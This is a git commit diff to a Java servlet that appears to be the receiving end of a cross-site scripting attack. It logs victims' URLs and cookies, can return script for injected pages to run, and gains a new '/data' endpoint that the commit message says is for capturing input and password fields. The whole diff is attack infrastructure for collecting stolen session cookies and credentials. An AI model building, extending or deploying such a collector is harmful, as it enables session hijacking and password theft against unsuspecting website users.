c33dec6327eb40849fc8f91813b546c4f14493a5
bran4he <brandon_he@163.com>
2016-11-01 01:22:50 +0800

    add get input/text/pass#word

--- src/main/java/com/ss/servlet/GetDataServlet.java
+++ src/main/java/com/ss/servlet/GetDataServlet.java
@@ -23,37 +23,46 @@ import com.ss.bean.InjectBean;
  * 
  * response {'name':'element/script/null', 'content':'?/?/?'};
  */
-@WebServlet(name = "GetDataServlet", urlPatterns={"/receive"})
+@WebServlet(name = "GetDataServlet", urlPatterns={"/receive", "/data"})
 public class GetDataServlet extends HttpServlet {
 	private static final long serialVersionUID = 1L;
     
 	private static Logger logger = Logger.getLogger(GetDataServlet.class);
 	
 	protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
-		String url = request.getParameter("url");
-		String cookie = request.getParameter("cookie");
-		logger.info(url);
-		logger.info(cookie);
 		
+		if("/receive".equals(request.getServletPath())){
+			String url = request.getParameter("url");
+			String cookie = request.getParameter("cookie");
+			logger.info(url);
+			logger.info(cookie);
+			
 //		InjectBean bean = new InjectBean("element", "onlne test");
 //		InjectBean bean = new InjectBean("script", "alert(1)");
-		InjectBean bean = new InjectBean();
-		
-		response.setCharacterEncoding("UTF-8");
-		response.setContentType("application/json; charset=utf-8");
-		PrintWriter out = null;
-		ObjectMapper mapper = new ObjectMapper();
-		try {
-		    out = response.getWriter();
-		    String jsonStr = mapper.writeValueAsString(bean);
-		    logger.info(jsonStr);
-		    out.write(jsonStr);
-		} catch (IOException e) {
-		    e.printStackTrace();
-		} finally {
-		    if (out != null) {
-		        out.close();
-		    }
+			InjectBean bean = new InjectBean();
+			
+			response.setCharacterEncoding("UTF-8");
+			response.setContentType("application/json; charset=utf-8");
+			PrintWriter out = null;
+			ObjectMapper mapper = new ObjectMapper();
+			try {
+				out = response.getWriter();
+				String jsonStr = mapper.writeValueAsString(bean);
+				logger.info(jsonStr);
+				out.write(jsonStr);
+			} catch (IOException e) {
+				e.printStackTrace();
+			} finally {
+				if (out != null) {
+					out.close();
+				}
+			}
+			
+		}else if("/data".equals(request.getServletPath())){
+			String url = request.getParameter("url");
+			String data = request.getParameter("data");
+			logger.info(url);
+			logger.info(data);
 		}
 	}
 
